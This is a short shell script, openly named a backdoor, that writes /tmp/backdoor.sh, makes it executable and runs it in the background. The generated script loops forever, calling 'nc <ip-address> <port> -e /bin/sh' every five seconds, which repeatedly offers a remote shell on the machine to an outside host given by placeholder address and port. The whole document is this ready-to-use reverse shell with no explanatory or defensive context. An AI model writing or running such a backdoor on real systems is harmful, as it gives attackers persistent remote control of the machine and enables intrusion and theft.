#!/bin/sh

echo "Create backdoor script..."

echo "#!/bin/sh"                              > /tmp/backdoor.sh
echo "while true; do"                        >> /tmp/backdoor.sh
echo "    echo ..."                          >> /tmp/backdoor.sh
echo "    nc <ip-address> <port> -e /bin/sh" >> /tmp/backdoor.sh
echo "    sleep 5"                           >> /tmp/backdoor.sh
echo "done"                                  >> /tmp/backdoor.sh

chmod +x /tmp/backdoor.sh
. /tmp/backdoor.sh &
